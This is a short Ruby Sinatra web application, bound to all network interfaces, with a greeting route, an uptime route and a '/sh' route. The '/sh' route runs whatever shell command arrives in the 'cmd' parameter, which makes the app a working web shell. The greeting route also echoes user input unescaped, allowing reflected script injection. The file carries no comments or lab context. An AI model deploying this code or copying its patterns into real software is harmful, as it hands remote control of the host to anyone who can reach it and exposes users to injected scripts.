require 'sinatra'
set :bind, '0.0.0.0'

get '/' do
  "Hello #{params[:name]}"
end

get '/uptime' do
  `uptime`
end

get '/sh' do
  command=params[:cmd]
  "Executing: #{command}"
  `#{command}`
end
